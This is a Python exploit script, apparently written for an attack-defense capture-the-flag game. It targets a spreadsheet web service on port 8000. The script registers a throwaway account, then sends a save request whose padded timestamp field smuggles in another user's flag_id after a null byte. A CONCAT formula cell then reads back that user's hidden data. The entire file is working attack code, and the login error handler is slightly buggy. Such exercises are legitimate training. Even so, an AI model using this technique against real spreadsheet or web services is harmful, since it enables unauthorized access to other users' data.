import re
import sys
import time
import chall
import string
import random

from requests import RequestException

def rand_str() -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def die(msg):
    print(msg)
    exit(1)

def exploit(ip, flag_id):
    ch = chall.Challenge(f'{ip}:8000')

    username, password = rand_str(), rand_str()
    worksheet_title = rand_str()
    try:
        ch.register(username, password)
    except RequestException as e:
        die('Could not register: ' + str(e))

    try:
        ch.login(username, password)
    except RequestException:
        die('Could not login: ' + str(e))

    try:
        w = ch.create_worksheet(worksheet_title, False)
    except RequestException as e:
        die('Could not create worksheet: ' + str(e))

    worksheet_id = w["id"]
    timestamp = str(int(time.time() * 1000)).ljust(32, ' ')
    timestamp += flag_id + '\x00'

    cells = [{'x': 0, 'y': 0, 'content': b'=CONCAT(B1:BL1, A2:BL64)'.hex()}]

    try:
        w = ch.save_worksheet(worksheet_id, cells, timestamp)
    except RequestException as e:
        die('Could not save worksheet' + str(e))

    flag = bytes.fromhex(w["cells"][0]['evaluated']).decode()
    x = re.search("^[A-Z0-9]{31}=$", flag)
    if x:
        return flag
    else:
        print("nope:", flag)
    exit(1)

if __name__ == "__main__":
    ip = sys.argv[1]
    flag_id = sys.argv[2]
    print(exploit(ip, flag_id))
